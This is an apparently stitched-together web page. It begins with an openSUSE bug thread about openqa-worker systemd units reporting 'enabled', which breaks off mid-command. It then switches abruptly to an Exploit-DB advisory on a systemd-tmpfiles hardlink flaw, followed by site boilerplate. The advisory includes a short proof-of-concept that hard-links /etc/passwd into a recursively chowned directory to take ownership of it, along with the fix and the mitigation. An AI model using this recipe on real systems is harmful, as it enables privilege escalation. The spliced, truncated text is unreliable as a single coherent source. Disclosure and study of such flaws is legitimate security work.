Apparently there are some additional conditions that trigger it. Lets at least find out whether those are just temporary conditions or permanent on loewe. could you reboot the machine and check whether the bug still appears? If yes, I have provided some testpackages with a proposed fix at:  [https://download.opensuse.org/repositories/home:/tsaupe:/branches:/openSUSE:/Leap:/42.3:/Update/standard/](https://download.opensuse.org/repositories/home%3A/tsaupe%3A/branches%3A/openSUSE%3A/Leap%3A/42.3%3A/Update/standard/)  Please give them a try and report feedback. ``` [Comment 6](show_bug.cgi?id=1075801#c6)  Franck Bui   2018-01-16 13:25:19 UTC  ``` Can you also show the output of "systemctl show openqa-worker@92".

Feel free to investigate on this machine. If you don't have access to the machine, send me your public key privately (IRC: SergioAtSUSE) and I will add it to seattle15.  Please be aware that to see the bug, such steps have to be followed:  ``` systemctl enable openqa-worker@1 systemctl restart openqa-worker@1  systemctl disable openqa-worker@2 systemctl restart openqa-worker@2  systemctl status openqa-worker@1 systemctl is-enabled openqa-worker@1  systemctl status openqa-worker@2 systemctl is-enabled openqa-worker@2 ```  Here also the information requested from fbui.  - systemctl cat openqa-worker@92: <http://pastebin.nue.suse.com/19827/src> - find /etc/systemd/system -name "openqa-worker@92*": <http://pastebin.nue.suse.com/19831/src> ``` [Comment 11](show_bug.cgi?id=1075801#c11)  Franck Bui   2018-01-24 16:15:07 UTC  ``` Ok now that I had access to your system, it seems that "enabled" state is expected even if the service has been disabled before.  The reason is that openqa-worker@2 service is still (statically) pulled in by openqa-worker.target:  > $ systemctl enable openqa-worker@2 > Created symlink from /etc/systemd/system/multi-user.target.wants/openqa-worker@2.service to /usr/lib/systemd/system/openqa-worker@.service.  > $ for p in /{etc,run,usr/lib}/systemd; do find $p -name openqa-worker@2.service; done > /etc/systemd/system/multi-user.target.wants/openqa-worker@2.service > /run/systemd/generator/openqa-worker.target.wants/openqa-worker@2.service  So "something" created a symlink in /run/systemd  > $ systemctl disable openqa-worker@2 > Removed symlink /etc/systemd/system/multi-user.target.wants/openqa-worker@2.service.  > $ for p in /{etc,run,usr/lib}/systemd; do find $p -name openqa-worker@2.service; done > /run/systemd/generator/openqa-worker.target.wants/openqa-worker@2.service  But the symlink in /run/systemd remains after disabling the service which makes the service status still at the "enabled" state.  The symlink was created by: /usr/lib/systemd/system-generators/systemd-openqa-generator, no idea how it's supposed to work but AFAICS systemd behavces correctly here.  Does that make sense ? ``` [Comment 12](show_bug.cgi?id=1075801#c12)  Sergio Lindo Mansilla   2018-01-25 12:43:26 UTC  ``` Thanks for investigating, but I am not sure that systemd is working properly.  If the reason for systemctl status to show enabled is based on the file located in /etc/systemd/system/multi-user.target.wants/, then it is still not working as expected.  At the moment I have this:  - openqa-worker@1 active and enabled. - openqa-worker@2 active and disabled. - openqa-worker@3 inactive and disabled.  But the output I get is the following:  ``` slindomansilla@seattle15:~> find /etc/systemd/system -name "openqa-worker@*" /etc/systemd/system/multi-user.target.wants/openqa-worker@1.service slindomansilla@seattle15:~> sudo systemctl status openqa-worker@1 ● openqa-worker@1.service - openQA Worker #1    Loaded: loaded (/usr/lib/systemd/system/openqa-worker@.service; enabled; vendor preset: disabled)    Active: active (running) since Thu 2018-01-25 13:35:16 CET; 2min 48s ago  Main PID: 24169 (worker)    CGroup: /system.slice/system-openqa\x2dworker.slice/openqa-worker@1.service            └─24169 /usr/bin/perl /usr/share/openqa/script/worker --instance 1  Jan 25 13:35:47 seattle15 worker[24169]: [Thu Jan 25 13:35:47 2018] [worker:error] got unknown command info Jan 25 13:36:02 seattle15 worker[24169]: [Thu Jan 25 13:36:02 2018] [worker:error] got unknown command info Jan 25 13:36:17 seattle15 worker[24169]: [Thu Jan 25 13:36:17 2018] [worker:error] got unknown command info Jan 25 13:36:32 seattle15 worker[24169]: [Thu Jan 25 13:36:32 2018] [worker:error] got unknown command info Jan 25 13:36:47 seattle15 worker[24169]: [Thu Jan 25 13:36:47 2018] [worker:error] got unknown command info Jan 25 13:37:02 seattle15 worker[24169]: [Thu Jan 25 13:37:02 2018] [worker:error] got unknown command info Jan 25 13:37:17 seattle15 worker[24169]: [Thu Jan 25 13:37:17 2018] [worker:error] got unknown command info Jan 25 13:37:32 seattle15 worker[24169]: [Thu Jan 25 13:37:32 2018] [worker:error] got unknown command info Jan 25 13:37:47 seattle15 worker[24169]: [Thu Jan 25 13:37:47 2018] [worker:error] got unknown command info Jan 25 13:38:02 seattle15 worker[24169]: [Thu Jan 25 13:38:02 2018] [worker:error] got unknown command info slindomansilla@seattle15:~> sudo systemctl status openqa-worker@2 ● openqa-worker@2.service - openQA Worker #2    Loaded: loaded (/usr/lib/systemd/system/openqa-worker@.service; enabled; vendor preset: disabled)    Active: active (running) since Thu 2018-01-25 13:35:23 CET; 2min 43s ago  Main PID: 24182 (worker)    CGroup: /system.slice/system-openqa\x2dworker.slice/openqa-worker@2.service            └─24182 /usr/bin/perl /usr/share/openqa/script/worker --instance 2  Jan 25 13:35:39 seattle15 worker[24182]: [Thu Jan 25 13:35:39 2018] [worker:error] got unknown command info Jan 25 13:35:54 seattle15 worker[24182]: [Thu Jan 25 13:35:54 2018] [worker:error] got unknown command info Jan 25 13:36:09 seattle15 worker[24182]: [Thu Jan 25 13:36:09 2018] [worker:error] got unknown command info Jan 25 13:36:24 seattle15 worker[24182]: [Thu Jan 25 13:36:24 2018] [worker:error] got unknown command info Jan 25 13:36:39 seattle15 worker[24182]: [Thu Jan 25 13:36:39 2018] [worker:error] got unknown command info Jan 25 13:36:54 seattle15 worker[24182]: [Thu Jan 25 13:36:54 2018] [worker:error] got unknown command info Jan 25 13:37:09 seattle15 worker[24182]: [Thu Jan 25 13:37:09 2018] [worker:error] got unknown command info Jan 25 13:37:24 seattle15 worker[24182]: [Thu Jan 25 13:37:24 2018] [worker:error] got unknown command info Jan 25 13:37:39 seattle15 worker[24182]: [Thu Jan 25 13:37:39 2018] [worker:error] got unknown command info Jan 25 13:37:54 seattle15 worker[24182]: [Thu Jan 25 13:37:54 2018] [worker:error] got unknown command info slindomansilla@seattle15:~> sudo systemctl status openqa-worker@3 ● openqa-worker@3.service - openQA Worker #3    Loaded: loaded (/usr/lib/systemd/system/openqa-worker@.service; enabled; vendor preset: disabled)    Active: inactive (dead) slindomansilla@seattle15:~> ``` ``` [Comment 13](show_bug.cgi?id=1075801#c13)  Sergio Lindo Mansilla   2018-01-25 12:51:54 UTC  ``` but systemctl is-enabled works as expected:  ``` slindomansilla@seattle15:~> sudo systemctl is-enabled openqa-worker@1 enabled slindomansilla@seattle15:~> sudo systemctl is-enabled openqa-worker@2 disabled slindomansilla@seattle15:~> sudo systemctl is-enabled openqa-worker@3 disabled slindomansilla@seattle15:~> ``` ``` [Comment 14](show_bug.cgi?id=1075801#c14)  Franck Bui   2018-01-25 13:14:51 UTC  ``` (In reply to Sergio Lindo Mansilla from [comment #12](show_bug.cgi?id=1075801#c12)) > Thanks for investigating, but I am not sure that systemd is working properly. >  > If the reason for systemctl status to show enabled is based on the file > located in /etc/systemd/system/multi-user.target.wants/, then it is still > not working as expected.  No it's not only based on symlinks in /etc/ but also the ones in /run/systemd and /usr/lib/systemd as explained in [comment #12](show_bug.cgi?id=1075801#c12). ``` [Comment 15](show_bug.cgi?id=1075801#c15)  Sergio Lindo Mansilla   2018-01-25 13:37:13 UTC  ``` ok, but the same happens, there is no other files on any of them:  ``` seattle15:~ # for p in /{etc,run,usr/lib}/systemd;

**Vulnerable App:**

```
Product: systemd (systemd-tmpfiles)
Versions-affected: 236 and earlier
Author: Michael Orlitzky
Fixed-in: commit 5579f85 , version 237
Bug-report: https://github.com/systemd/systemd/issues/7736
Acknowledgments: Lennart Poettering who, instead of calling me an idiot
  for not realizing that systemd enables fs.protected_hardlinks by
  default, went out of his way to harden the non-default configuration.

== Summary ==

Before version 237, the systemd-tmpfiles program will change the
permissions and ownership of hard links. If the administrator disables
the fs.protected_hardlinks sysctl, then an attacker can create hard
links to sensitive files and subvert systemd-tmpfiles, particularly
with "Z" type entries.

Systemd as PID 1 with the default fs.protected_hardlinks=1 is safe.

== Details ==

When running as PID 1, systemd enables the fs.protected_hardlinks
sysctl by default; that prevents an attacker from creating hard links
to files that he can't write to. If, however, the administrator should
decide to disable that sysctl, then hard links may be created to any
file (on the same filesystem).

Before version 237, the systemd-tmpfiles program will voluntarily
change the permissions and ownership of a hard link, and that is
exploitable in a few scenarios. The most problematic and easiest to
exploit is the "Z" type tmpfiles.d entry, which changes ownership and
permissions recursively. For an example, consider the following
tmpfiles.d entries,

  d /var/lib/systemd-exploit-recursive 0755 mjo mjo
  Z /var/lib/systemd-exploit-recursive 0755 mjo mjo

Whenever systemd-tmpfiles is run, those entries make mjo the owner of
everything under and including /var/lib/systemd-exploit-recursive. After
the first run, mjo can create a hard link inside that directory pointing
to /etc/passwd. The next run (after a reboot, for example) changes the
ownership of /etc/passwd.

A proof-of-concept can be run from the systemd source tree, using
either two separate terminals or sudo:

  root # sysctl -w fs.protected_hardlinks=0
  root # sysctl -w kernel.grsecurity.linking_restrictions=0
  root # ./build/systemd-tmpfiles --create
  mjo $ ln /etc/passwd /var/lib/systemd-exploit-recursive/x
  root # ./build/systemd-tmpfiles --create
  mjo $ /bin/ls -l /etc/passwd
  -rwxr-xr-x 2 mjo mjo 1504 Dec 20 14:27 /etc/passwd

More elaborate exploits are possible, and not only the "Z" type is
vulnerable.

== Resolution ==

The recursive change of ownership/permissions does not seem to be safely
doable without fs.protected_hardlinks enabled.

In version 237 and later, systemd-tmpfiles calls fstatat() immediately
after obtaining a file descriptor from open():

  fd = open(path, O_NOFOLLOW|O_CLOEXEC|O_PATH);
  if (fd < 0) {
    ...
  }
  if (fstatat(fd, "", &st, AT_EMPTY_PATH) < 0)

The st->st_nlink field is then checked to determine whether or not fd
describes a hard link. If it does, the ownership/permissions are not
changed, and an error is displayed:

  if (hardlink_vulnerable(&st)) {
    log_error("Refusing to set permissions on hardlink...", path);
    return -EPERM;
  }

There is still a tiny window between open() and fstatat() where the
attacker can fool this countermeasure by removing an existing hard
link to, say, /etc/passwd. In that case, st->st_nlink will be 1, but
fd still references /etc/passwd. The attack succeeds, but is much
harder to do, and the window is as narrow as possible. More to the
point, it seems unavoidable when implementing the tmpfiles.d
specification.

== Mitigation ==

Leave the fs.protected_hardlinks sysctl enabled.

compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
